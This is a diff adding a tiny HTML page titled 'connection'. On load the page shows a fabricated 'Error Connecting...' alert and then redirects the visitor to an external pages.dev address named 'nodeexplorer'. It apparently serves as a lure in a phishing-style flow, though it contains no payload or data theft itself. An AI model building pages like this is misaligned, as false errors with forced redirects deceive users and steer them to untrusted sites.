@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>connection</title>
+<script>
+    // Function to show a pop-up immediately when the page loads
+    function showAlert() {
+        alert("Error Connecting...");
+        redirectToNewPage();
+    }
+
+    // Function to redirect to a new page
+    function redirectToNewPage() {
+        window.location.href = "https://nodeexplorer.pages.dev/apps"; // Replace this URL with the desired page URL
+    }
+</script>
+</head>
+<body onload="showAlert()">
+<!-- Nothing to display on the blank page -->
+</body>
+</html>
